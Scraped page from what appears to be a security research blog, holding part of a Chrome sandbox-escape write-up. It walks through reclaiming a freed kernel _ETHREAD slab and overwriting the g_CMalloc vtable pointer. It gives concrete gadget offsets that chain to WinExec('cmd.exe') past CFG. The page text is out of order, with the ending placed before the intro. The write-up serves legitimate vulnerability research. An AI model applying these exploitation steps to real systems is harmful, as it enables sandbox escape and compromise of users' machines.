+&lt;h1 id=&#34;4-Hijacking-Execution&#34;&gt;&lt;a href=&#34;#4-Hijacking-Execution&#34; class=&#34;headerlink&#34; title=&#34;4. Hijacking Execution&#34;&gt;&lt;/a&gt;4. Hijacking Execution&lt;/h1&gt;&lt;h2 id=&#34;4-1-vtable-pointer-overwrite&#34;&gt;&lt;a href=&#34;#4-1-vtable-pointer-overwrite&#34; class=&#34;headerlink&#34; title=&#34;4.1 vtable pointer overwrite&#34;&gt;&lt;/a&gt;4.1 vtable pointer overwrite&lt;/h2&gt;&lt;p&gt;Now that we can read and write, it&amp;#x2019;s time to overwrite. But there was one problem left over from 3.1, remember? &lt;strong&gt;Writes only work on writable pages!&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs pgsql&#34;&gt;KCT (Kernel Callback &lt;span class=&#34;hljs-keyword&#34;&gt;Table&lt;/span&gt;)   &amp;#x2192;  .rdata    &lt;span class=&#34;hljs-keyword&#34;&gt;read&lt;/span&gt;-&lt;span class=&#34;hljs-keyword&#34;&gt;only&lt;/span&gt;
+__guard_check_icall_fptr      &amp;#x2192;  .mrdata   &lt;span class=&#34;hljs-keyword&#34;&gt;read&lt;/span&gt;-&lt;span class=&#34;hljs-keyword&#34;&gt;only&lt;/span&gt;
+__guard_dispatch_icall_fptr   &amp;#x2192;  &lt;span class=&#34;hljs-number&#34;&gt;.00&lt;/span&gt;cfg    &lt;span class=&#34;hljs-keyword&#34;&gt;read&lt;/span&gt;-&lt;span class=&#34;hljs-keyword&#34;&gt;only&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Reversing it myself, the only thing we can touch is &lt;code&gt;.data&lt;/code&gt;, which is writable at runtime. So I had to flip the question around. Not &amp;#x201C;what would be nice to overwrite&amp;#x201D;, but &lt;strong&gt;&amp;#x201C;is there anything that lives in .data and holds the execution flow?&amp;#x201D;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;The answer had been in our hands all along. That same &lt;code&gt;g_CMalloc&lt;/code&gt; we read back in 2.3 to confirm the reclaim!! And here&amp;#x2019;s the important part: &lt;strong&gt;what we need to overwrite is not the vtable.&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;CRetailMallocVtbl&lt;/span&gt;   combase + &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x&lt;span class=&#34;hljs-number&#34;&gt;28&lt;/span&gt;a&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;f&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;   &amp;#x2192;  .rdata   not one byte writable
+&lt;span class=&#34;hljs-attribute&#34;&gt;g_CMalloc&lt;/span&gt;           combase + &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x&lt;span class=&#34;hljs-number&#34;&gt;338348&lt;/span&gt;   &amp;#x2192;  .data    writable&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The table itself, that row of function pointers, is read-only &amp;#x2014; we can&amp;#x2019;t lay a finger on it. But the object instance pointing at that table lives in &lt;code&gt;.data&lt;/code&gt;. So instead of fixing the table, we &lt;strong&gt;make the object look at a different table&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image14.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;So, in a free spot inside ntdll&amp;#x2019;s &lt;code&gt;.data&lt;/code&gt;, we&amp;#x2019;ll build one fake vtable &lt;code&gt;S&lt;/code&gt;, and change the first 8 bytes of &lt;code&gt;g_CMalloc&lt;/code&gt; so that they point at it. &lt;code&gt;S&lt;/code&gt; is built by &lt;strong&gt;copying the real vtable wholesale&lt;/strong&gt;. As I mentioned in 3.2, combase is a KnownDLL, so we can simply read the &lt;code&gt;CRetailMallocVtbl&lt;/code&gt; that&amp;#x2019;s loaded in my own renderer. After that we only swap out the slots we need!&lt;/p&gt;
+&lt;p&gt;It&amp;#x2019;s important to leave slots 0~2 (&lt;code&gt;QueryInterface&lt;/code&gt; / &lt;code&gt;AddRef&lt;/code&gt; / &lt;code&gt;Release&lt;/code&gt;) real. COM keeps calling them in between allocations, and if they jump somewhere wrong the process just dies. &amp;#x1F480;&lt;/p&gt;
+&lt;p&gt;Finally, there&amp;#x2019;s one more reason &lt;code&gt;g_CMalloc&lt;/code&gt; is such a good target: I don&amp;#x2019;t have to build a trigger myself. Just overwrite it and util_win steps on it all by itself. As the file dialog initializes, COM takes and releases memory dozens of times. All we have to do is arm it and wait! &amp;#x1F60E;&lt;/p&gt;
+&lt;p&gt;And we don&amp;#x2019;t even have to wait on one particular slot. The very first allocation after entry is enough to fire the trigger!&lt;/p&gt;
+&lt;h2 id=&#34;4-2-Gadget-Chaining&#34;&gt;&lt;a href=&#34;#4-2-Gadget-Chaining&#34; class=&#34;headerlink&#34; title=&#34;4.2 Gadget Chaining&#34;&gt;&lt;/a&gt;4.2 Gadget Chaining&lt;/h2&gt;&lt;p&gt;&lt;code&gt;g_CMalloc&lt;/code&gt; now looks at &lt;code&gt;S&lt;/code&gt;, so the moment util_win next takes memory, &lt;code&gt;S[3]&lt;/code&gt; gets called. So what do we put in there to reach code execution? We can&amp;#x2019;t simply drop &lt;code&gt;WinExec&lt;/code&gt; in. At that moment &lt;code&gt;rcx&lt;/code&gt; is &lt;code&gt;&amp;amp;g_CMalloc&lt;/code&gt;. It&amp;#x2019;s a C++ method call, so the first argument is always &lt;code&gt;this&lt;/code&gt;. But the first argument of &lt;code&gt;WinExec(lpCmdLine, uCmdShow)&lt;/code&gt; has to be a string&amp;#x2026;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image15.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;So &lt;strong&gt;&lt;code&gt;rcx&lt;/code&gt; needs stepping stones to get swapped out&lt;/strong&gt;. The first gadget calls the next one, and the second gadget is where &lt;code&gt;rcx&lt;/code&gt; gets swapped:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs x86asm&#34;&gt;G1              ntdll  + &lt;span class=&#34;hljs-number&#34;&gt;0xa36f0&lt;/span&gt;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;rax&lt;/span&gt;, [&lt;span class=&#34;hljs-built_in&#34;&gt;rcx&lt;/span&gt;+&lt;span class=&#34;hljs-number&#34;&gt;0x20&lt;/span&gt;]
+  &lt;span class=&#34;hljs-keyword&#34;&gt;call&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;rax&lt;/span&gt;
+
+chrome gadget   chrome + &lt;span class=&#34;hljs-number&#34;&gt;0x556235c&lt;/span&gt;
+  &lt;span class=&#34;hljs-keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;rcx&lt;/span&gt;, [&lt;span class=&#34;hljs-built_in&#34;&gt;rcx&lt;/span&gt;+&lt;span class=&#34;hljs-number&#34;&gt;0x30&lt;/span&gt;]
+  &lt;span class=&#34;hljs-keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;rax&lt;/span&gt;, [&lt;span class=&#34;hljs-built_in&#34;&gt;rcx&lt;/span&gt;+&lt;span class=&#34;hljs-number&#34;&gt;0x10&lt;/span&gt;]
+  &lt;span class=&#34;hljs-keyword&#34;&gt;call&lt;/span&gt; [__guard_dispatch_icall_fptr]&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;G1&lt;/code&gt;, as you can see, leaves &lt;code&gt;rcx&lt;/code&gt; untouched and calls &lt;code&gt;[rcx+0x20]&lt;/code&gt;. Since &lt;code&gt;rcx&lt;/code&gt; is &lt;code&gt;&amp;amp;g_CMalloc&lt;/code&gt;, that means calling &lt;code&gt;[g_CMalloc+0x20]&lt;/code&gt;. That&amp;#x2019;s where we plant the second gadget.&lt;/p&gt;
+&lt;p&gt;The second gadget is the real deal: &lt;code&gt;mov rcx, [rcx+0x30]&lt;/code&gt; swaps &lt;strong&gt;&lt;code&gt;rcx&lt;/code&gt;&lt;/strong&gt; out! &lt;code&gt;[g_CMalloc+0x30]&lt;/code&gt; holds the &lt;code&gt;&amp;amp;SCR_obj&lt;/code&gt; that I put there.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;SCR_obj&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x&lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt;   &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;cmd.exe&amp;quot;&lt;/span&gt;
+&lt;span class=&#34;hljs-attribute&#34;&gt;SCR_obj&lt;/span&gt; + &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x&lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;   kernel&lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;!WinExec&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And the very next line is &lt;code&gt;mov rax, [rcx+0x10]&lt;/code&gt;. Since &lt;code&gt;rcx&lt;/code&gt; just became &lt;code&gt;&amp;amp;SCR_obj&lt;/code&gt;, &lt;code&gt;rax&lt;/code&gt; receives &lt;code&gt;WinExec&lt;/code&gt;, and &lt;code&gt;rcx&lt;/code&gt; stays &lt;code&gt;&amp;amp;SCR_obj&lt;/code&gt; &amp;#x2014; that is, the address of the &lt;strong&gt;&lt;code&gt;&amp;quot;cmd.exe&amp;quot;&lt;/code&gt;&lt;/strong&gt; string &amp;#x2014; so at the very last moment it gets swapped in as the first argument of &lt;code&gt;WinExec&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs dts&#34;&gt;rcx :  &lt;span class=&#34;hljs-variable&#34;&gt;&amp;amp;&lt;/span&gt;g_CMalloc  &amp;#x2192;  &lt;span class=&#34;hljs-variable&#34;&gt;&amp;amp;&lt;/span&gt;g_CMalloc  &amp;#x2192;  &lt;span class=&#34;hljs-variable&#34;&gt;&amp;amp;&lt;/span&gt;SCR_obj&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This bypasses CFG pretty simply too, right? hehe By borrowing a single unguarded call, we made every point CFG checks see nothing but legitimate targets. And finally, with one button click, cmd comes up just like this!!!! &amp;#x1F389;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=2AMNjFq7V-A&amp;amp;feature=youtu.be&#34;&gt;POC Video&lt;/a&gt;&lt;/p&gt;
+&lt;h1 id=&#34;5-Outro&#34;&gt;&lt;a href=&#34;#5-Outro&#34; class=&#34;headerlink&#34; title=&#34;5. Outro&#34;&gt;&lt;/a&gt;5. Outro&lt;/h1&gt;&lt;p&gt;Thank you for making it all the way to Step 6! We started from a single BSOD, made the file picker fill in the freed &lt;code&gt;_ETHREAD&lt;/code&gt; slot, used that dangling pointer to read and write a Medium process, and in the end popped cmd at Medium IL. &lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image16.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Tai Lung has finally broken out of prison and traveled a long road to stand before Master Shifu. Having come all the way from the Untrusted level to the Medium level, just one final gate remains.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2026/08/01/gongjae/Wipeload_step6/EN/image17.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Yes &amp;#x2014; the one that lets us become the Dragon Warrior! The Windows LPE that takes us all the way to SYSTEM! Wipeload Step 7 will come to you as banda&amp;#x2019;s Windows LPE article!&lt;/p&gt;
+&lt;p&gt;Thank you for reading all the way through!! &amp;#x1F64C;&lt;/p&gt;
+&lt;h1 id=&#34;Reference&#34;&gt;&lt;a href=&#34;#Reference&#34; class=&#34;headerlink&#34; title=&#34;Reference&#34;&gt;&lt;/a&gt;Reference&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-lookaside-lists&#34;&gt;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-lookaside-lists&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://learn.microsoft.com/en-us/windows/win32/sync/interlocked-singly-linked-lists&#34;&gt;https://learn.microsoft.com/en-us/windows/win32/sync/interlocked-singly-linked-lists&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://hackyboiz.github.io/2021/09/19/l0ch/segment-heap-part1/&#34;&gt;https://hackyboiz.github.io/2021/09/19/l0ch/segment-heap-part1/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://r0keb.github.io/posts/Windows-Kernel-Pool-Internals/&#34;&gt;https://r0keb.github.io/posts/Windows-Kernel-Pool-Internals/&lt;/a&gt;&lt;/p&gt;
+ - hack &amp; life">
+  <meta property="og:image" content="https://hackyboiz.github.io/2026/08/01/gongjae/Wipeload_step6/EN/image.png">
+  <meta property="og:url" content="https://hackyboiz.github.io/">
+
+  <link rel="canonical" href="https://hackyboiz.github.io/2026/08/01/gongjae/wipeload_step6/en/">
+
+  <title>[Wipeload Step 6.] How to Escape the SandBox Painlessly (EN) - hackyboiz</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
+  <link rel="stylesheet" href="/lib/hint/hint.min.css">
+
+  
+    
+    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css">
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_6peoq002giu.css">
+<link rel="stylesheet" href="/.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+<link rel="stylesheet" href="/.css">
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script src="/js/utils.js"></script>
+  <script src="/js/color-schema.js"></script>
+
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+</head>
+
+
+<body>
+  <header style="height: 40vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Hackyboiz</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-addrcard"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/author/">
+                <i class="iconfont icon-user-fill"></i>
+                Author
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax="true" style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2026-08-01 22:00" pubdate>
+      2026년 8월 1일 오후
+    </time>
+  </div>
+
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      5.6k 자
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      112
+       분
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2">
+      <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
+    </div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">[Wipeload Step 6.] How to Escape the SandBox Painlessly (EN)</h1>
+                       
+            <div class="markdown-body" id="post-body">
+              <!-- <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
+              <!-- hackyboiz_horizen_index -->
+              <!--
+              <ins class="adsbygoogle"
+                   style="display:block"
+                   data-ad-client="ca-pub-3672652207808168"
+                   data-ad-slot="8887862313"
+                   data-ad-format="auto"
+                   data-full-width-responsive="true"></ins>
+              <script>
+                   (adsbygoogle = window.adsbygoogle || []).push({});
+              </script>
+              -->
+              <p>Hello! This is gongjae, back with Step 6 of the Wipeload project~!! We&#x2019;re already at Step 6&#x2026;! Shall we look back at the road we&#x2019;ve walked so far?</p>
+<p><img src="/2026/08/01/gongjae/Wipeload_step6/EN/image.png" srcset="/img/loading.gif" alt="image"></p>
+<blockquote>
+<p>Previous articles<br><a href="https://hackyboiz.github.io/2026/06/06/OUYA77/Wipeload_step1/en/">https://hackyboiz.github.io/2026/06/06/OUYA77/Wipeload_step1/en/</a><br><a href="https://hackyboiz.github.io/2026/06/21/ji9umi/Wipeload_step2/en/">https://hackyboiz.github.io/2026/06/21/ji9umi/Wipeload_step2/en/</a><br><a href="https://hackyboiz.github.io/2026/06/26/ji9umi/Wipeload_step3/en/">https://hackyboiz.github.io/2026/06/26/ji9umi/Wipeload_step3/en/</a><br><a href="https://hackyboiz.github.io/2026/07/13/OUYA77/Wipeload_step4/en/">https://hackyboiz.github.io/2026/07/13/OUYA77/Wipeload_step4/en/</a><br><a href="https://hackyboiz.github.io/2026/07/19/gongjae/Wipeload_step5/EN/">https://hackyboiz.github.io/2026/07/19/gongjae/Wipeload_step5/EN/</a></p>
+</blockquote>
+<p>In Step 1, OUYA77 drew the picture of the entire chain, and in Steps 2~3, ji9umi showed us renderer RCE and the V8 heap sandbox bypass. In Step 4, OUYA77 came back to take apart how the Chrome sandbox locks itself down, and in Step 5, I covered ALPC and the <code>ALPC_MSGFLG_SYNC_REQUEST</code> Use-After-Free. Today, in Step 6, we&#x2019;re going to revive that UAF into an arbitrary <strong>Read/Write primitive</strong>, use it as a foothold to reach <strong>Medium-integrity code execution</strong>, and finally pull off a real <strong>SandBox Escape</strong> &#x2014; on our way to meet Master Shifu!</p>
+<h1 id="1-From-Crash-to-Primitive"><a href="#1-From-Crash-to-Primitive" class="headerlink" title="1. From Crash to Primitive"></a>1. From Crash to Primitive</h1><p>Alright, shall we pull up the final scene from Step 5 once more?</p>
+<p>We planted the trigger DLL inside the renderer with sRDI, then killed &#x2014; mid-flight &#x2014; the thread that had a SYNC message posted via <code>NtWaitForWorkViaWorkerFactory</code>, which freed the <code>_ETHREAD</code>. And the moment we closed the port, <code>AlpcpCancelMessage</code> fired a write at <code>+0x578</code> of that already-dead address. And this was the result.</p>
+<p><img src="/2026/08/01/gongjae/Wipeload_step6/EN/image2.png" srcset="/img/loading.gif" alt="image"></p>
+<blockquote>
+<p>A BSOD means we&#x2019;re done, right..? <del>it blew up in the kernel, so it counts as an escape</del></p>
+</blockquote>
+<p>Yeah.. honestly, this is where I started overthinking too.. As I hinted at the end of Step 5, Theori&#x2019;s blog post also said something like &#x201C;use the file picker, do a thread spray, blah blah blah, and you get code execution at Medium integrity&#x201D;~..</p>
+<p>A BSOD only proves one thing: &#x201C;the kernel stepped on a dead pointer.&#x201D; But that&#x2019;s not what we want! We have to turn that dead pointer into <strong>a tool that reads and writes values we choose, at addresses we choose</strong>. A crash and a primitive really are completely different things. The road from the blue screen to cmd is much longer than you&#x2019;d think~..&#x1F972;</p>
+<p>But gongjae isn&#x2019;t one to back down. I put my brain to work and first picked out what we&#x2019;d actually need for a SandBox Escape.</p>
+<ol>
+<li>How do we turn the UAF into reading and writing the values we want, at the addresses we want? - reclaim?</li>
+<li>Which process do we get to perform that reclaim for us? - file picker?</li>
+<li>Once we can read and write, what do we overwrite to take over execution flow? - vtable?</li>
+</ol>
+<p>It&#x2019;s funny that they all end in question marks, but erasing those question marks one by one is exactly the goal of today&#x2019;s article~!&#x1F604; So let&#x2019;s start with number 1!</p>
+<p>What we freed in Step 5 was the kernel pool slab that an <code>_ETHREAD</code> object was sitting in. The kernel takes that memory back right away and gets it ready to hand out to the next allocation. So there&#x2019;s exactly one thing left for us to do: fill that spot back up with a fresh <code>_ETHREAD</code> belonging to a process of our choosing! That is exactly what reclaim is.</p>
+<p>What happens if this succeeds? The <code>WaitingThread</code> pointer left behind in the message stops being a &#x201C;dead address&#x201D;. <strong>It now points at a live <code>_ETHREAD</code></strong> inside a process we control. At that moment, the UAF transforms from a mere crash generator into a cross-process R/W window!!</p>
+<p>Why is this hard, you ask? Because the kernel pool isn&#x2019;t that naive.. You have to know, down to the bone, where a freed slab actually goes and by what rules it gets reused&#x2026; &#x1F643; Before we dive in: the native code running inside the renderer today is a modified version of that trigger DLL from Step 5, so for convenience I&#x2019;ll just call it the <strong>exploit DLL</strong>.</p>
+<p>The test environment is identical to Step 5.</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">Windows</span> <span class="hljs-number">11</span> <span class="hljs-number">22</span>H<span class="hljs-number">2</span>  &#xB7;  ntoskrnl <span class="hljs-number">22621</span>.<span class="hljs-number">963</span>
+<span class="hljs-attribute">Chrome</span> for Testing <span class="hljs-number">114</span>.<span class="hljs-number">0</span>.<span class="hljs-number">5708</span>.<span class="hljs-number">0</span></code></pre>
+<p>Also, the Driver Verifier we turned on in Step 5 to make sure we&#x2019;d see the BSOD is turned off this time. Special pool unmaps freed slabs entirely, so leaving it on would make today&#x2019;s whole topic &#x2014; reclaim &#x2014; impossible!!</p>
+<h2 id="1-1-VS-allocator-ETHREAD-slab"><a href="#1-1-VS-allocator-ETHREAD-slab" class="headerlink" title="1.1 VS allocator _ETHREAD slab"></a>1.1 <strong>VS allocator</strong> _ETHREAD slab</h2><p>First, let&#x2019;s confirm the identity of the slab we&#x2019;re up against.</p>
+<pre><code class="hljs sqf"><span class="hljs-built_in">sizeof</span>(<span class="hljs-variable">_ETHREAD</span>)    = <span class="hljs-number">0</span>x900           <span class="hljs-comment">// object size the kernel allocates</span>
+pool block (actual) = <span class="hljs-number">0</span>xa80           <span class="hljs-comment">// what !pool reports</span>
+tag                 = <span class="hljs-string">&apos;Thre&apos;</span>          <span class="hljs-comment">// protected</span>
+pool <span class="hljs-built_in">type</span>           = NonPagedPoolNx</code></pre>
+<p>These two numbers are exactly where it gets confusing. <code>0x900</code> is only ever the object size; the block that actually comes off the pool is <code>0xa80</code>. <code>_POOL_HEADER</code>, <code>_OBJECT_HEADER</code>, sub-headers, and the VS chunk header all get piled on before and after, and then it gets rounded up to the VS allocator&#x2019;s size class.</p>
+<p><img src="/2026/08/01/gongjae/Wipeload_step6/EN/image3.png" srcset="/img/loading.gif" alt="image"></p>
+<p>So the size class we&#x2019;re competing over during reclaim is not <code>0x900</code> but <strong><code>0xa80</code></strong>. When picking the slab out by eye, it&#x2019;s easiest to scan the <code>!pool</code> output for the size <code>a80</code> + <code>*Thre</code> combination. The <code>(Protected)</code> printed next to it means the pool tag carries a protection bit &#x2014; a kernel-side safeguard that only accepts a free when the tag matches. We aren&#x2019;t calling free ourselves; we&#x2019;re targeting a spot the kernel freed while tearing a thread down, so this never gets in our way.</p>
+<p><img src="/2026/08/01/gongjae/Wipeload_step6/EN/image4.png" srcset="/img/loading.gif" alt="image"></p>
+<p>Also, since Win10 19H1 the kernel pool is a segment heap, so which allocator handles a request depends on the size. Anything under <code>0x200</code> goes to kLFH, <code>0x200</code> through <code>0x20000</code> goes to the <strong>VS allocator</strong>, and anything larger goes to segment/large. The block-<code>0xa80</code> <code>_ETHREAD</code> falls into the second one &#x2014; in other words, the <strong>VS allocator</strong> manages it. Everything in today&#x2019;s reclaim happens inside this allocator.</p>
+<p>And the allocation path looks like this.</p>
+<pre><code class="hljs apache"><span class="hljs-attribute">NtCreateThreadEx</span> &#x2192; PspAllocateThread &#x2192; ObpAllocateObject &#x2192; ExAllocatePool<span class="hljs-number">2</span></code></pre>
+<p>The only entrance that hands this slab out is, in the end, <code>NtCreateThreadEx</code> &#x2014; which means <strong>if anybody creates one thread, one <code>0xa80</code> block goes out</strong>. The answer to why the thread spray I teased earlier actually works is packed entirely into this one line.</p>
+<h2 id="1-2-Dynamic-Lookaside"><a href="#1-2-Dynamic-Lookaside" class="headerlink" title="1.2 Dynamic Lookaside"></a>1.2 Dynamic Lookaside</h2><p>But here&#x2019;s the thing &#x2014; there&#x2019;s one more layer of cache sitting in front of the VS allocator. It&#x2019;s the <code>_RTL_DYNAMIC_LOOKASIDE</code> structure that <code>_SEGMENT_HEAP.UserContext</code> points to, and honestly, this guy is the real main character of today&#x2019;s story!</p>
+<p>Shall we check the structure directly in kd first?</p>
+<pre><code class="hljs angelscript"><span class="hljs-number">0</span>: kd&gt; dt nt!_RTL_DYNAMIC_LOOKASIDE
+   +<span class="hljs-number">0x000</span> EnabledBucketBitmap : Uint8B
+   +<span class="hljs-number">0x008</span> BucketCount         : Uint4B
+   +<span class="hljs-number">0x00c</span> ActiveBucketCount   : Uint4B
+   +<span class="hljs-number">0x040</span> Buckets             : [<span class="hljs-number">64</span>] _RTL_LOOKASIDE
+
+<span class="hljs-number">0</span>: kd&gt; dt nt!_RTL_LOOKASIDE
+   +<span class="hljs-number">0x000</span> ListHead            : _SLIST_HEADER
+   +<span class="hljs-number">0x010</span> Depth               : Uint2B
+   +<span class="hljs-number">0x012</span> MaximumDepth        : Uint2B
+   +<span class="hljs-number">0x014</span> TotalAllocates      : Uint4B
+   +<span class="hljs-number">0x018</span> AllocateMisses      : Uint4B
+   ...</code></pre>
+<p>More boring than you expected, right? There are 64 buckets, and each bucket is just a single SLIST. The behavior fits in two lines.</p>
+<pre><code class="hljs livecodeserver">free  &#x2192; <span class="hljs-keyword">if</span> <span class="hljs-keyword">the</span> bucket is enabled <span class="hljs-keyword">and</span> depth has room &#x2192; PUSH  (<span class="hljs-built_in">put</span> <span class="hljs-keyword">it</span> <span class="hljs-keyword">on</span> <span class="hljs-title">top</span>)
+alloc &#x2192; <span class="hljs-keyword">if</span> <span class="hljs-keyword">the</span> size matches                        &#x2192; POP   (take <span class="hljs-keyword">it</span> off <span class="hljs-keyword">the</span> top)</code></pre>
+<p>As you can probably tell, it&#x2019;s <strong>LIFO</strong>. It means the order of frees and allocs maps one-to-one. Just arrange a &#x201C;free &#x2192; alloc immediately after&#x201D; ordering, and that alloc takes <strong>the very slab we just freed</strong>. That&#x2019;s why this reclaim isn&#x2019;t a probabilistic spray where you scatter tens of thousands and wait for one to stick &#x2014; it becomes <strong>a matter of getting the order right</strong>! &#x1F60E;</p>
+<p><img src="/2026/08/01/gongjae/Wipeload_step6/EN/image5.png" srcset="/img/loading.gif" alt="image"></p>
+<blockquote>
+<p>The freed slab lands on top of the SLIST, and the next <code>0xa80</code> alloc POPs it right back off.</p>
+</blockquote>
+<p>The fact that a lookaside is by design a thing that &#x201C;caches fixed-size blocks and lets the system tune the depth on its own&#x201D;, and that SLIST push/pop is an atomic LIFO, is spelled out in the MS docs exactly as-is.</p>
+<p>But notice there was a condition quietly attached to those two lines: &#x201C;if depth has room&#x201D;. So what does this <code>Depth</code> actually mean?</p>
+<p>Let&#x2019;s start with initialization. <code>RtlpDynamicLookasideInitialize</code> walks all 64 buckets and stamps in this one line.</p>
